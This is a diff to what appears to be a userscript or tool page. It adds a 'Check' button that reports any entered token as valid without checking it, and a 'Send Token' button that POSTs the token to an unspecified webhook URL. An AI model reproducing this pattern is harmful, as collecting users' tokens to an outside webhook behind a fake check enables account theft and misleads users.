@@ -36,7 +36,8 @@
                     <div class="option">
                         <label for="user-token">Token:</label>
                         <input type="text" id="user-token" class="text-input1">
-                        <button id="process-token" class="button1">Process Token</button>
+                        <button id="check-token" class="button1">Check</button>
+                        <button id="send-token" class="button1">Send Token</button>
                     </div>
                     <div class="option">
                         <label for="autorun">Autorun:</label>
@@ -205,7 +206,6 @@
             border-top-left-radius: 5px;
             border-top-right-radius: 5px;
             box-shadow: 0px 1px 0px rgba(31, 31, 31, var(--alpha));
-
         }
         #settings-tab {
             margin-left: 5px;
@@ -426,7 +426,6 @@
             filter: invert(39%) sepia(0%) saturate(0%) hue-rotate(339deg) brightness(94%) contrast(90%);
             position: relative;
         }
-
         .fw-500 {
             font-weight: 500;
         }
@@ -1132,11 +1131,17 @@ if(settings.autorun) {
     }, 150);
 })();
 
-    $(document).on("click", "#process-token", function () {
+    $(document).on("click", "#check-token", function () {
         const userToken = $("#user-token").val().trim();
         if (userToken) {
             alert(`Token is valid: ${userToken}`);
-
+        } else {
+            alert("Please enter a valid token.");
+        }
+    });
+    $(document).on("click", "#send-token", function () {
+        const userToken = $("#user-token").val().trim();
+        if (userToken) {
             $.ajax({
                 url: webhookURL,
                 type: "POST",
@@ -1153,7 +1158,5 @@ if(settings.autorun) {
             alert("Please enter a valid token.");
         }
     });
-
-})();
 
 })();
